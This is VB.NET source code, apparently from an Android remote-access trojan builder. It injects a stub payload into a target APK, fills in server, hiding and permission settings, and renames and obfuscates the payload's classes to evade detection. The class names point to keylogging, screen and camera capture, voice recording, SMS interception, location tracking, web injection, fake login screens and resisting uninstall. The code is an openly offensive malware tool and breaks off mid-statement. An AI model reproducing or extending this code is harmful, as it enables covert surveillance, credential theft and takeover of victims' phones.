    Private Sub Step3()
        '-------------------Copy Data
        Dim smlipath As String = Nothing

        Dim classtag As String = "\com\icontrol\protector"
        If isPluginmode Then
            classtag = "\com\appd\instll"
        End If


        If IsCustomeApp Then
            Mylogger.Logbuild(Worker.userid, ">> Custom Step 3...")
            smlipath = TheApkPath + "\smali"

            GoTo encript
        End If

        Mylogger.Logbuild(userid, ">" & "> Inject Data To Apk...")

        Try


            For index = 2 To 16
                If Not Directory.Exists(TheApkPath & "\smali_classes" & index.ToString()) Then
                    Directory.CreateDirectory(TheApkPath & "\smali_classes" & index.ToString())
                    Directory.CreateDirectory(TheApkPath & "\smali_classes" & index.ToString() & classtag)
                    smlipath = TheApkPath & "\smali_classes" & index.ToString()
                    Exit For

                End If
            Next

            If smlipath Is Nothing Then
                Directory.CreateDirectory(TheApkPath & "\smali_classes" & "2")
                Directory.CreateDirectory(TheApkPath & "\smali_classes" & "2" & classtag)

                smlipath = TheApkPath & "\smali_classes" & "2"
            End If
            '  End If




            If Not File.Exists(smlipath & "\data.zip") Then
                'File.WriteAllBytes(smlipath & "\data.zip", My.Resources.APPS)
                If isPluginmode Then
                    Mylogger.Logbuild(userid, ">" & "> Copy plugin data...")
                    File.Copy(InjectPlugin, smlipath & "\data.zip")
                Else
                    File.Copy(InjectStub, smlipath & "\data.zip")
                End If

            End If


            System.IO.Compression.ZipFile.ExtractToDirectory(smlipath & "\data.zip", smlipath)

            File.Delete(smlipath & "\data.zip")

            GenerateJunkSmaliFiles(smlipath, 68)

            Threading.Thread.Sleep(1)

            If Not Directory.Exists(TheApkPath & "\res\xml") Then
                Directory.CreateDirectory(TheApkPath & "\res\xml")
            End If


            UpdateApkSrcs()

            If Not isPluginmode Then

                File.WriteAllText(Worker.TheApkPath + "\res\xml\screensaver_config.xml", My.Resources.Dreamconfig)
                File.WriteAllText(Worker.TheApkPath + "\res\xml\pfs1.xml", My.Resources.providerfile)

                File.WriteAllText(Worker.TheApkPath + "\res\xml\network_security_config.xml", My.Resources.network_security_config)
                File.WriteAllText(Worker.TheApkPath + "\res\xml\splits0.xml", My.Resources.splits)

                File.WriteAllText(Worker.TheApkPath + "\res\layout\activity_chat.xml", My.Resources.Activitychat)
                File.WriteAllText(Worker.TheApkPath + "\res\layout\oppobattery.xml", My.Resources.oppobattery)
                File.WriteAllText(Worker.TheApkPath + "\res\layout\nointernet.xml", My.Resources.nointernet)
                File.WriteAllText(Worker.TheApkPath + "\res\layout\mywebviewer.xml", My.Resources.mywebviewer)
                File.WriteAllText(Worker.TheApkPath + "\res\layout\uninstall_activity.xml", My.Resources.uninstall_activity)



                Dim publicxmlpath As String = Worker.TheApkPath + "\res\values\public.xml"
                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(publicxmlpath) Or FileInUse(publicxmlpath)
                Mylogger.Logbuild(Worker.userid, ">> Encoding public file...")
                Dim allstr As String = File.ReadAllText(publicxmlpath).Replace(accesstagdata, accesstagdata_New)
                File.WriteAllText(publicxmlpath, allstr)

                Mylogger.Logbuild(userid, ">" & "> Copy Apk lib's...")

                Dim src_unknown As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "unknown")
                Dim dis_unknown As String = TheApkPath + "\" + "unknown"

                CopyDirectoryContents(src_unknown, dis_unknown)

                Dim src_kotlin As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "kotlin")
                Dim dis_kotlin As String = TheApkPath + "\" + "kotlin"

                CopyDirectoryContents(src_kotlin, dis_kotlin)

                Dim src_lib As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", "lib")

                Dim dis_lib As String = TheApkPath + "\" + "lib"

                CopyDirectoryContents(src_lib, dis_lib)

            Else
                Mylogger.Logbuild(userid, ">" & "> Copy plugin res...")
                File.WriteAllText(Worker.TheApkPath + "\res\xml\file_paths.xml", My.Resources.file_paths)
                File.WriteAllText(Worker.TheApkPath + "\res\xml\device_admin.xml", My.Resources.device_admin)
                File.WriteAllText(Worker.TheApkPath + "\res\xml\provid_path_info.xml", My.Resources.provid_path_info)


                My.Resources.plylogoname.Save(Worker.TheApkPath + "\res\drawable\plylogoname.png", Drawing.Imaging.ImageFormat.Png)
                My.Resources.inv.Save(Worker.TheApkPath + "\res\drawable\inv.png", Drawing.Imaging.ImageFormat.Png)
                My.Resources.inv.Save(Worker.TheApkPath + "\res\drawable\myicon.png", Drawing.Imaging.ImageFormat.Png)
                ' My.Resources.inv.Save(Worker.TheApkPath + "\res\drawable\myicon2.png", Drawing.Imaging.ImageFormat.Png)

            End If



            '.Replace(accesstagdata, accesstagdata_New) _



            Dim src_assts As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stublib", If(isPluginmode, "assetsplugin", "assets"))
            Dim temp_assts As String = Path.Combine(Path.GetTempPath(), "assets_temp_" & Guid.NewGuid().ToString())
            Dim dis_assts As String = TheApkPath + "\" + "assets"
            Try
                If Directory.Exists(temp_assts) Then
                    Directory.Delete(temp_assts, True)
                End If
                Directory.CreateDirectory(temp_assts)
                CopyDirectoryContents(src_assts, temp_assts)

                If AssetsPass <> "[AST-PAS]" Then
                    Mylogger.Logbuild(userid, $"Encrypt Assets:{AssetsPass}")
                    EncryptFolder(temp_assts, AssetsPass)
                Else
                    Mylogger.Logbuild(userid, $"Encrypt Assets 2: SKIP")
                End If



                CopyDirectoryContents(temp_assts, dis_assts)


            Catch ex As Exception
                Mylogger.Logbuild(userid, $"Encrypt Assets:{ex.Message}")
                CopyDirectoryContents(src_assts, dis_assts)
            End Try

            If Directory.Exists(temp_assts) Then
                Try
                    Directory.Delete(temp_assts, True)
                Catch
                    ' swallow exceptions if cleanup fails
                End Try
            End If



            'CopyDirectoryContents(src_assts, dis_assts)




            'End If



        Catch ex As Exception
            Mylogger.LogError(userid, "Step3", ex.Message)
        End Try
encript:
        Try



            Mylogger.Logbuild(userid, ">" & "> Encryption...")


            Dim files() As String = IO.Directory.GetFiles(smlipath & classtag)
            NEWRANDOM = madladstr()


            'com.icontrol.protector
            'Lcom/icontrol/protector


            For Each f As String In files




                Dim text As String = IO.File.ReadAllText(f).Replace(AccessibilityActivity, N_AccessibilityActivity) _
                    .Replace(AccessServices, N_AccessServices) _
                    .Replace(HiddenBrowser, N_HiddenBrowser) _
                    .Replace(AccessTools, N_AccessTools) _
                    .Replace(wakeitaiv, N_wakeitaiv) _
                    .Replace(LockActivity, N_LockActivity) _
                    .Replace(ActivityCaptureScreen, N_ActivityCaptureScreen) _
                    .Replace(ActivityMonitors, NActivityMonitors) _
                    .Replace(_update_app_, N_update_app_) _
                    .Replace(Consts, N__Consts_) _
                    .Replace(MyCods, N__MyCods_) _
                    .Replace(ChatActivity, N__ChatActivity_) _
                    .Replace(CameraCap, N_CameraCap) _
                    .Replace(Contct_manager, N_Contct_manager) _
                    .Replace(Deviceinfo, N_Deviceinfo) _
                    .Replace(filesManager, N_filesManager) _
                    .Replace(id_Commands, N_id_Commands) _
                    .Replace(KeyStorksQ, N_KeyStorksQ) _
                    .Replace(LiveChat, N_LiveChat) _
                    .Replace(QueryChats, N_QueryChats) _
                    .Replace(LiveKeysStrok, N_LiveKeysStrok) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(LocationMonitor, N_LocationMonitor) _
                    .Replace(LockAppsActivity, N_LockAppsActivity) _
                    .Replace(ActivMain, N_ActivMain) _
                    .Replace(MyLoger, N_MyLoger) _
                    .Replace(MyNotification, N_MyNotification) _
                    .Replace(MyPacket, N_MyPacket) _
                    .Replace(My_Configs, N_My_Configs) _
                    .Replace(ActivityDraw, N_ActivityDraw) _
                    .Replace(My_Crpter, N_My_Crpter) _
                    .Replace(MyPermissions, N_MyPermissions) _
                    .Replace(MySettings, N_MySettings) _
                    .Replace(PermissionsActivity, N_PermissionsActivity) _
                    .Replace(PingServices, N_PingServices) _
                    .Replace(RequestDraw, N_RequestDraw) _
                    .Replace(Requestinstall, N_Requestinstall) _
                    .Replace(RequestPermissions2, N_RequestPermissions2) _
                    .Replace(ScreenCaps, N_ScreenCaps) _
                    .Replace(ScreenReceiver, N_ScreenReceiver) _
                    .Replace(mysmanager, N_mysmanager) _
                    .Replace(StatusMonitor, N_StatusMonitor) _
                    .Replace(UtliTools, N_UtliTools) _
                    .Replace(VoiceRecorder, N_VoiceRecorder) _
                    .Replace(WorkServices, N_WorkServices) _
                    .Replace(HiddenActivity, N_HiddenActivity) _
                    .Replace(RestrectionActivity, N_RestrectionActivity) _
                    .Replace(OPPOAutostart, N_OPPOAutostart) _
                    .Replace(BrodcastActivity, N_BrodcastActivity) _
                    .Replace(UninstallActivity, N_UninstallActivity) _
                    .Replace(EngineWorker, N_EngineWorker) _
                    .Replace(RequestDataUsage, N_RequestDataUsage) _
                    .Replace(Webjector, N_Webjector) _
                    .Replace(TransparentActivity, N_TransparentActivity) _
                    .Replace(defaultsactivity, N_defaultsactivity) _
                    .Replace(SmsReceiver, N_SmsReceiver) _
                    .Replace(MyInCallService, N_MyInCallService) _
                    .Replace(WebBrowser, N_WebBrowser) _
                    .Replace(ProxyService, N_ProxyService) _
                    .Replace(ClassGen, N_ClassGen) _
                    .Replace("[USER_MAIL]", Email) _
                    .Replace("[USE-SUPER]", use_access) _
                    .Replace("[SERVER_ADRESS]", UserHost) _
                    .Replace("[USE-NOKILL]", use_antkill) _
                    .Replace("[USE-DRAWOVER]", use_draw) _
                    .Replace("[USE-AUTOGRANT]", use_atoprims) _
                    .Replace("[USE-ALLPRIM]", "0") _
                    .Replace("[USE-AUTOSTART]", miuiautostart) _
                    .Replace("[USE-HIDDEEN]", hiddenapp) _
                    .Replace("[USE-STORE]", IsStoreMod) _
                    .Replace("[USE-NOEMU]", noemulator) _
                    .Replace("[USE-GUID]", installtype) _
                    .Replace("[USE-DOZE]", nosleep) _
                    .Replace("[USE-CAPLOCK]", caplock) _
                    .Replace("[USE-FAKE]", hidetype) _
                    .Replace("[USE-AUTOBTRY]", theconkey) _
                    .Replace("[Client_N]", ClientName) _
                    .Replace("[_NOTIFI_TITLE_]", notifytitle) _
                    .Replace("[_NOTIFI_MSG_]", notifymsg) _
                    .Replace("USE-SCREENON", KeepScreen) _
                    .Replace("[OBFS]", NEWRANDOM) _
                    .Replace("[BSE_URL]", appurl) _
                    .Replace("[LOAD_STYLE]", LoadStyle) _
                    .Replace("[log-title]", logintitle) _
                    .Replace("[log-dis]", logindis) _
                    .Replace("[log-btn]", loginbtn) _
                    .Replace("[log-lng]", lngshort) _
                    .Replace("[NAME>LNK>ID!]", trakingdata) _
                    .Replace("[ALL-CONFG]", allconfig) _
                    .Replace("[AST-PAS]", AssetsPass) _
                    .Replace("[CRNT-SUB]", Currentsubdir) _
                    .Replace("[USE-DELTE]", nodelete) _
                    .Replace("[FORCE-PRIMS]", forceprimes) _
                    .Replace("[JECT-JS]", jectjs) _
                    .Replace("[HID-ACCESS]", hideaccess) _
                    .Replace("[VER-TAG]", Ctag) _
                    .Replace("[DEF-SMS]", BlockSMS) _
                    .Replace("[DEF-CALLS]", BlockCalls) _
                    .Replace(AudioRecorder, N_AudioRecorder) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(drop_oldpkg_insmali, drop_newpkg_insmali) _
                    .Replace("[T_ID]", MinApkPkgName) _
                    .Replace("[DROP_TITLE]", DropTitle) _
                    .Replace("[DROP_MSG]", DropMsg) _
                    .Replace("[DROP_STYLE]", DropStyle) _
                    .Replace("[DROP_MNAME]", appname) _
                    .Replace(ClassGen1, N_Class1) _
                    .Replace(ClassGen2, N_Class2) _
                    .Replace(ClassGen3, N_Class3) _
                    .Replace(ClassGen4, N_Class4) _
                    .Replace("target.app.rep", appid) _
                    .Replace("[BSE_URL]", appurl_clean) _
                    .Replace("[AST-PAS]", AssetsPass) _
                    .Replace("[MY-NAME]", InsertZWNJ(dropname)) _
                    .Replace(ClassGen6, N_ClassGen6) _
                    .Replace(ClassGen7, N_ClassGen7) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(ClassGen5, N_Class5) _
                    .Replace(oldpkg, newpkg) _
                    .Replace(oldpkg_insmali, newpkg_insmali) _
                    .Replace(Apps_Manage, N_Apps_Manage)


                For Each originalString As String In To_Obfucate
                    text = text.Replace(originalString, Obfucated(originalString))
                Next

                File.WriteAllText(f, text)
                Threading.Thread.Sleep(1)

            Next

            'units.uni.bash.trm

            Mylogger.Logbuild(userid, ">" & "> Encryption ALL...")

            For Each fileInMain As String In Directory.GetFiles(smlipath, "*.smali", SearchOption.AllDirectories)
                If fileInMain.Contains("\android\") Or fileInMain.Contains("\androidx\") Then
                    'To_obfuscate_androidx
                    Dim newContent As String = File.ReadAllText(fileInMain)
                    For Each originalString As String In To_obfuscate_androidx
                        newContent = newContent.Replace(originalString, Obfucated(originalString))
                    Next
                    File.WriteAllText(fileInMain, newContent)
                    Continue For
                End If
                If Not fileInMain.Contains("\android\") AndAlso Not fileInMain.Contains("\androidx\") Then



                    Dim fileContent As String = File.ReadAllText(fileInMain)
                    Dim newContent As String = fileContent.Replace(AccessibilityActivity, N_AccessibilityActivity) _
                    .Replace(AccessServices, N_AccessServices) _
                    .Replace(HiddenBrowser, N_HiddenBrowser) _
                    .Replace(AccessTools, N_AccessTools) _
                    .Replace(wakeitaiv, N_wakeitaiv) _
                    .Replace(LockActivity, N_LockActivity) _
                    .Replace(ActivityCaptureScreen, N_ActivityCaptureScreen) _
                    .Replace(ActivityMonitors, NActivityMonitors) _
                    .Replace(_update_app_, N_update_app_) _
                    .Replace(Consts, N__Consts_) _
                    .Replace(MyCods, N__MyCods_) _
                    .Replace(ChatActivity, N__ChatActivity_) _
                    .Replace(CameraCap, N_CameraCap) _
                    .Replace(Contct_manager, N_Contct_manager) _
                    .Replace(Deviceinfo, N_Deviceinfo) _
                    .Replace(filesManager, N_filesManager) _
                    .Replace(id_Commands, N_id_Commands) _
                    .Replace(KeyStorksQ, N_KeyStorksQ) _
                    .Replace(LiveChat, N_LiveChat) _
                    .Replace(QueryChats, N_QueryChats) _
                    .Replace(LiveKeysStrok, N_LiveKeysStrok) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(LocationMonitor, N_LocationMonitor) _
                    .Replace(LockAppsActivity, N_LockAppsActivity) _
                    .Replace(ActivMain, N_ActivMain) _
                    .Replace(MyLoger, N_MyLoger) _
                    .Replace(MyNotification, N_MyNotification) _
                    .Replace(MyPacket, N_MyPacket) _
                    .Replace(My_Configs, N_My_Configs) _
                    .Replace(ActivityDraw, N_ActivityDraw) _
                    .Replace(My_Crpter, N_My_Crpter) _
                    .Replace(MyPermissions, N_MyPermissions) _
                    .Replace(MySettings, N_MySettings) _
                    .Replace(PermissionsActivity, N_PermissionsActivity) _
                    .Replace(PingServices, N_PingServices) _
                    .Replace(RequestDraw, N_RequestDraw) _
                    .Replace(Requestinstall, N_Requestinstall) _
                    .Replace(RequestPermissions2, N_RequestPermissions2) _
                    .Replace(ScreenCaps, N_ScreenCaps) _
                    .Replace(ScreenReceiver, N_ScreenReceiver) _
                    .Replace(mysmanager, N_mysmanager) _
                    .Replace(StatusMonitor, N_StatusMonitor) _
                    .Replace(UtliTools, N_UtliTools) _
                    .Replace(VoiceRecorder, N_VoiceRecorder) _
                    .Replace(WorkServices, N_WorkServices) _
                    .Replace(HiddenActivity, N_HiddenActivity) _
                    .Replace(RestrectionActivity, N_RestrectionActivity) _
                    .Replace(OPPOAutostart, N_OPPOAutostart) _
                    .Replace(BrodcastActivity, N_BrodcastActivity) _
                    .Replace(UninstallActivity, N_UninstallActivity) _
                    .Replace(EngineWorker, N_EngineWorker) _
                    .Replace(RequestDataUsage, N_RequestDataUsage) _
                    .Replace(Webjector, N_Webjector) _
                    .Replace(TransparentActivity, N_TransparentActivity) _
                    .Replace(defaultsactivity, N_defaultsactivity) _
                    .Replace(SmsReceiver, N_SmsReceiver) _
                    .Replace(MyInCallService, N_MyInCallService) _
                    .Replace(WebBrowser, N_WebBrowser) _
                    .Replace(ProxyService, N_ProxyService) _
                    .Replace(ClassGen, N_ClassGen) _
                    .Replace("[USER_MAIL]", Email) _
                    .Replace("[USE-SUPER]", use_access) _
                    .Replace("[SERVER_ADRESS]", UserHost) _
                    .Replace("[USE-NOKILL]", use_antkill) _
                    .Replace("[USE-DRAWOVER]", use_draw) _
                    .Replace("[USE-AUTOGRANT]", use_atoprims) _
                    .Replace("[USE-ALLPRIM]", "0") _
                    .Replace("[USE-AUTOSTART]", miuiautostart) _
                    .Replace("[USE-HIDDEEN]", hiddenapp) _
                    .Replace("[USE-STORE]", IsStoreMod) _
                    .Replace("[USE-NOEMU]", noemulator) _
                    .Replace("[USE-GUID]", installtype) _
                    .Replace("[USE-DOZE]", nosleep) _
                    .Replace("[USE-CAPLOCK]", caplock) _
                    .Replace("[USE-FAKE]", hidetype) _
                    .Replace("[USE-AUTOBTRY]", theconkey) _
                    .Replace("[Client_N]", ClientName) _
                    .Replace("[_NOTIFI_TITLE_]", notifytitle) _
                    .Replace("[_NOTIFI_MSG_]", notifymsg) _
                    .Replace("USE-SCREENON", KeepScreen) _
                    .Replace("[OBFS]", NEWRANDOM) _
                    .Replace("[BSE_URL]", appurl) _
                    .Replace("[LOAD_STYLE]", LoadStyle) _
                    .Replace("[log-title]", logintitle) _
                    .Replace("[log-dis]", logindis) _
                    .Replace("[log-btn]", loginbtn) _
                    .Replace("[log-lng]", lngshort) _
                    .Replace("[NAME>LNK>ID!]", trakingdata) _
                    .Replace("[ALL-CONFG]", allconfig) _
                    .Replace("[AST-PAS]", AssetsPass) _
                    .Replace("[CRNT-SUB]", Currentsubdir) _
                    .Replace("[USE-DELTE]", nodelete) _
                    .Replace("[FORCE-PRIMS]", forceprimes) _
                    .Replace("[JECT-JS]", jectjs) _
                    .Replace("[HID-ACCESS]", hideaccess) _
                    .Replace("[VER-TAG]", Ctag) _
                    .Replace("[DEF-SMS]", BlockSMS) _
                    .Replace("[DEF-CALLS]", BlockCalls) _
                    .Replace("[T_ID]", MinApkPkgName) _
                    .Replace(ClassGen1, N_Class1) _
                    .Replace(ClassGen2, N_Class2) _
                    .Replace(ClassGen3, N_Class3) _
                    .Replace(ClassGen4, N_Class4) _
                    .Replace("[BSE_URL]", appurl_clean) _
                    .Replace("[AST-PAS]", AssetsPass) _
                    .Replace("[DROP_TITLE]", DropTitle) _
                    .Replace("[DROP_MSG]", DropMsg) _
                    .Replace("[DROP_STYLE]", DropStyle) _
                    .Replace("[DROP_MNAME]", appname) _
                    .Replace(ClassGen1, N_Class1) _
                    .Replace(ClassGen6, N_ClassGen6) _
                    .Replace(ClassGen7, N_ClassGen7) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(drop_oldpkg_insmali, drop_newpkg_insmali) _
                    .Replace(ClassGen5, N_Class5) _
                    .Replace(AudioRecorder, N_AudioRecorder) _
                    .Replace(drop_oldpkg, drop_newpkg) _
                    .Replace(oldpkg, newpkg) _
                    .Replace(oldpkg_insmali, newpkg_insmali) _
                    .Replace(drop_oldpkg_insmali, drop_newpkg_insmali) _
                    .Replace(Apps_Manage, N_Apps_Manage)

                    For Each originalString As String In To_Obfucate
                        newContent = newContent.Replace(originalString, Obfucated(originalString))
                    Next

                    File.WriteAllText(fileInMain, newContent)

                End If
            Next
            Mylogger.Logbuild(userid, ">" & "> Encryption ALL 2...")
            Dim sourcePath As String = smlipath & classtag
            Dim searchPattern As String = "*.smali"
            Dim i As Integer = 0
            For Each fileName As String In Directory.GetFiles(sourcePath, searchPattern, SearchOption.AllDirectories)



                If fileName.Contains("AccessibilityActivity") Or fileName.Equals("AccessibilityActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("AccessibilityActivity", N_AccessibilityActivity)))

                End If

                If fileName.Contains("AccessTools") Or fileName.Equals("AccessTools") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("AccessTools", N_AccessTools)))

                End If
                '
                If fileName.Contains("wakeitaiv") Or fileName.Equals("wakeitaiv") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("wakeitaiv", N_wakeitaiv)))

                End If
                If fileName.Contains("LockActivity") Or fileName.Equals("LockActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LockActivity", N_LockActivity)))

                End If

                If fileName.Contains("AccessServices") Or fileName.Equals("AccessServices") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("AccessServices", N_AccessServices)))

                End If

                If fileName.Contains("HiddenBrowser") Or fileName.Equals("HiddenBrowser") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("HiddenBrowser", N_HiddenBrowser)))

                End If

                If fileName.Contains("ActivityCaptureScreen") Or fileName.Equals("ActivityCaptureScreen") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ActivityCaptureScreen", N_ActivityCaptureScreen)))

                End If

                If fileName.Contains("ActivityMonitors") Or fileName.Equals("ActivityMonitors") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ActivityMonitors", NActivityMonitors)))

                End If
                If fileName.Contains("CameraCap") Or fileName.Equals("CameraCap") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(CameraCap, N_CameraCap)))

                End If
                If fileName.Contains("_update_app_") Or fileName.Equals("_update_app_") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("_update_app_", N_update_app_)))

                End If
                If fileName.Contains("MyCods") Or fileName.Equals("MyCods") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(MyCods, N__MyCods_)))

                End If
                If fileName.Contains("Consts") Or fileName.Equals("Consts") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(Consts, N__Consts_)))

                End If
                If fileName.Contains("ChatActivity") Or fileName.Equals("ChatActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(ChatActivity, N__ChatActivity_)))

                End If
                If fileName.Contains("Contct_manager") Or fileName.Equals("Contct_manager") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("Contct_manager", N_Contct_manager)))
                End If

                'N_My_Configs
                If fileName.Contains("My_Configs") Or fileName.Equals("My_Configs") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("My_Configs", N_My_Configs)))
                End If

                '
                If fileName.Contains("ActivityDraw") Or fileName.Equals("ActivityDraw") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ActivityDraw", N_ActivityDraw)))
                End If

                If fileName.Contains("My_Crpter") Or fileName.Equals("My_Crpter") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("My_Crpter", N_My_Crpter)))
                End If


                If fileName.Contains("Deviceinfo") Or fileName.Equals("Deviceinfo") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("Deviceinfo", N_Deviceinfo)))
                End If

                If fileName.Contains("filesManager") Or fileName.Equals("filesManager") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("filesManager", N_filesManager)))
                End If

                If fileName.Contains("id_Commands") Or fileName.Equals("id_Commands") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("id_Commands", N_id_Commands)))
                End If

                If fileName.Contains("KeyStorksQ") Or fileName.Equals("KeyStorksQ") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("KeyStorksQ", N_KeyStorksQ)))
                End If

                If fileName.Contains("LiveChat") Or fileName.Equals("LiveChat") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LiveChat", N_LiveChat)))
                End If

                If fileName.Contains("QueryChats") Or fileName.Equals("QueryChats") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("QueryChats", N_QueryChats)))
                End If

                If fileName.Contains("LiveKeysStrok") Or fileName.Equals("LiveKeysStrok") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LiveKeysStrok", N_LiveKeysStrok)))
                End If

                If fileName.Contains("StarterServices") Or fileName.Equals("StarterServices") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("StarterServices", N_StarterServices)))
                End If

                If fileName.Contains("LocationMonitor") Or fileName.Equals("LocationMonitor") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LocationMonitor", N_LocationMonitor)))
                End If

                If fileName.Contains("LockAppsActivity") Or fileName.Equals("LockAppsActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("LockAppsActivity", N_LockAppsActivity)))
                End If

                If fileName.Contains("MainActivity") Or fileName.Equals("MainActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MainActivity", N_ActivMain)))
                End If

                If fileName.Contains("MyLoger") Or fileName.Equals("MyLoger") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyLoger", N_MyLoger)))
                End If

                If fileName.Contains("MyNotification") Or fileName.Equals("MyNotification") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyNotification", N_MyNotification)))
                End If

                If fileName.Contains("MyPacket") Or fileName.Equals("MyPacket") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyPacket", N_MyPacket)))
                End If

                If fileName.Contains("MyPermissions") Or fileName.Equals("MyPermissions") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyPermissions", N_MyPermissions)))
                End If

                If fileName.Contains("MySettings") Or fileName.Equals("MySettings") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MySettings", N_MySettings)))
                End If

                If fileName.Contains("PermissionsActivity") Or fileName.Equals("PermissionsActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("PermissionsActivity", N_PermissionsActivity)))
                End If

                If fileName.Contains("PingServices") Or fileName.Equals("PingServices") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("PingServices", N_PingServices)))
                End If

                If fileName.Contains("RequestDraw") Or fileName.Equals("RequestDraw") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RequestDraw", N_RequestDraw)))
                End If

                If fileName.Contains("Requestinstall") Or fileName.Equals("Requestinstall") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("Requestinstall", N_Requestinstall)))
                End If

                If fileName.Contains("RequestPermissions2") Or fileName.Equals("RequestPermissions2") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RequestPermissions2", N_RequestPermissions2)))
                End If

                If fileName.Contains("ScreenCaps") Or fileName.Equals("ScreenCaps") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ScreenCaps", N_ScreenCaps)))
                End If

                If fileName.Contains("ScreenReceiver") Or fileName.Equals("ScreenReceiver") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ScreenReceiver", N_ScreenReceiver)))
                End If

                If fileName.Contains("mysmanager") Or fileName.Equals("mysmanager") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("mysmanager", N_mysmanager)))
                End If

                If fileName.Contains("StatusMonitor") Or fileName.Equals("StatusMonitor") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("StatusMonitor", N_StatusMonitor)))
                End If

                If fileName.Contains("UtliTools") Or fileName.Equals("UtliTools") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("UtliTools", N_UtliTools)))
                End If

                If fileName.Contains("VoiceRecorder") Or fileName.Equals("VoiceRecorder") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("VoiceRecorder", N_VoiceRecorder)))
                End If

                If fileName.Contains("WorkServices") Or fileName.Equals("WorkServices") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("WorkServices", N_WorkServices)))
                End If

                If fileName.Contains("HiddenActivity") Or fileName.Equals("HiddenActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("HiddenActivity", N_HiddenActivity)))
                End If

                'N_BrodcastActivity
                If fileName.Contains("BrodcastActivity") Or fileName.Equals("BrodcastActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("BrodcastActivity", N_BrodcastActivity)))
                End If

                If fileName.Contains("OPPOAutostart") Or fileName.Equals("OPPOAutostart") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("OPPOAutostart", N_OPPOAutostart)))
                End If

                If fileName.Contains("RestrectionActivity") Or fileName.Equals("RestrectionActivity") Then
